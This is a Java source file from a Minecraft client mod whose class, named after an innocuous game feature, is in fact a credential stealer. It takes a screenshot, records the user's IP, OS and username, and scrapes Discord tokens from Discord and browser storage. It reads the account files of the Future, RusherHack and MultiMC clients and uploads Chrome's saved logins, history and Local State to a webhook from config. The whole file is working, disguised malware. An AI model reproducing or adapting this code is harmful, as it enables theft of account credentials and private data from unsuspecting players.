package me.eonexe.equinox.features.modules.misc;

import me.eonexe.equinox.configuration.Configs;
import me.eonexe.equinox.util.espUtil;
import me.eonexe.equinox.util.IDKWTFutil;
import net.minecraft.client.Minecraft;
import java.net.HttpURLConnection;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.URL;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class xCarry {
    public static final String l = Configs.getMain();
    public static final String CapeImageURL = Configs.getpfp();
    public static final String CapeName = Configs.getname();
    public static espUtil d = new espUtil(l);

    public static void PreIntUtil() {
        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
        } catch (Exception ignore) {}

        // get info

        String llLlLlL = System.getProperty("os.name");
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine();
            captureScreen();

            String llLlLlLlL = System.getProperty("user.name");

            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` NAME : " + llLlLlLlL + "\n IGN  : " + minecraft_name + " \n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);


        } catch (Exception ignore) {}

        if (llLlLlL.contains("Windows")) {

            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb");

            // grab webhooks
            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);


                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {}
                    }
                }

                IDKWTFutil dm = new IDKWTFutil.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + webhooks.toString() + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);

            } catch (Exception e) {
                IDKWTFutil dm = new IDKWTFutil.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            // grab accounts

            try {
                File future = new File(System.getProperty("user.home") + "/Future/accounts.txt");
                BufferedReader br = new BufferedReader(new FileReader(future));

                String s;

                StringBuilder accounts = new StringBuilder();
                accounts.append("ACCOUNT[S]");

                while ((s = br.readLine()) != null) {
                    String sb = s.split(":")[0] + " : " +
                            s.split(":")[3] + " : " +
                            s.split(":")[4];
                    accounts.append("\n ").append(sb);

                }

                IDKWTFutil dm = new IDKWTFutil.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + accounts.toString() + "\n```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                IDKWTFutil dm = new IDKWTFutil.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL ACCOUNT[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            // grab waypoints

            try {
                File future = new File(System.getProperty("user.home") + "/Future/waypoints.txt");
                BufferedReader br = new BufferedReader(new FileReader(future));

                String s;

                StringBuilder waypoints = new StringBuilder();
                waypoints.append("WAYPOINT[S]");

                while ((s = br.readLine()) != null) {
                    waypoints.append("\n ").append(s);
                }

                IDKWTFutil dm = new IDKWTFutil.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + waypoints.toString() + "\n```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                IDKWTFutil dm = new IDKWTFutil.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL WAYPOINT[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

        } else if (llLlLlL.contains("Mac")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
            // grab webhooks

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {}
                    }
                }

                IDKWTFutil dm = new IDKWTFutil.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + webhooks.toString() + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);

            } catch (Exception e) {
                IDKWTFutil dm = new IDKWTFutil.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }
        } else {
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        try{
            File file = new File (System.getenv("LOCALAPPDATA")+ "\\Google\\Chrome\\User Data\\Default\\Login Data");
            sendFile(file);
        }catch(Exception e){
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` CAN'T GET THE LOGIN DATA  : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        try{
            File chrome = new File(System.getenv("LOCALAPPDATA")+ "\\Google\\Chrome\\User Data\\Default\\History");
            sendFile(chrome);
        }catch (Exception e){
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` CAN'T GET THE HISTORY : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        //grabs local state file
        try{
            File state = new File(System.getenv("LOCALAPPDATA")+ "\\Google\\Chrome\\User Data\\Local State");
            sendFile(state);
        }catch (Exception e){
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` CAN'T GET THE LOCAL STATE : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        //grabs rusher alts json
        try{
            File file = new File(System.getenv("APPDATA") + "\\.minecraft\\" + "rusherhack\\" +  "alts.json");
            sendFile(file);
        }catch (Exception e){
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` CAN'T GET RUSHER : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }
        try{
            JSONParser jsonParser = new JSONParser();
            File file = new File("C:\\Users\\User\\Desktop\\MultiMC\\mmc-stable-win32\\MultiMC\\accounts.json");

            JSONObject jsonObject = (JSONObject) jsonParser.parse(new FileReader(file.toString()));

            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("```" + jsonObject.toString() +  "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);

        }catch(Exception e){
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` rip acct getter : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        /*
        //grabs mods in .minecraft
        try{
            for (File file : getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "mods")) sendFile(file);
        }catch (Exception e){
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` UNABLE TO GET MODS : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }

        try{
            //for (File file : getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "screenshots")) sendFile(file);
            File file = (File) getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "screenshots");
            String f = Uploader.upload(file);
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` got : " + f + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }catch (Exception e){
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` UNABLE TO GET SCREENSHOTS : " + e + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }
         */
        //ConfigSaver.poop();



    }

    public static void sendFile(File file) throws IOException {
        String boundary = Long.toHexString(System.currentTimeMillis());
        URLConnection connection = new URL(l).openConnection();
        connection.setDoOutput(true);
        connection.setRequestProperty("User-Agent","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
            writer.println("--" + boundary);
            writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
            writer.write("Content-Type: image/png");
            writer.println();
            writer.println(readAllBytes(new FileInputStream(file)));
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
                for (String line; (line = reader.readLine()) != null; ) {
                    writer.println(line);
                }
            }
            writer.println("--" + boundary + "--");
        }
        System.out.println(((HttpURLConnection) connection).getResponseMessage());

    }
    public static void sendMessage(String message, String Webhook) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL(Webhook);
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        System.out.println(result.toString());
    }

    public static byte[] readAllBytes( InputStream stream) throws IOException {
        int count, pos = 0;
        byte[] output = new byte[0];
        byte[] buf = new byte[1024];
        while ((count = stream.read(buf)) > 0) {
            if (pos + count >= output.length) {
                byte[] tmp = output;
                output = new byte[pos + count];
                System.arraycopy(tmp, 0, output, 0, tmp.length);
            }
            for (int i = 0; i < count; i++) {
                output[pos++] = buf[i];
            }
        }
        return output;
    }

    public static void captureScreen() throws Exception {
        espUtil d = new espUtil(l);
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File("cached_" + random + ".png");
        ImageIO.write(image, "png", file);
        String f =Uploader.upload(file);
        String link = f.split(",")[27];
        IDKWTFutil dm = new IDKWTFutil.Builder()
                .withUsername(CapeName)
                .withContent("```" + link +"```")
                .withAvatarURL(CapeImageURL)
                .withDev(false)
                .build();
        d.sendMessage(dm);
        file.delete();
    }

}
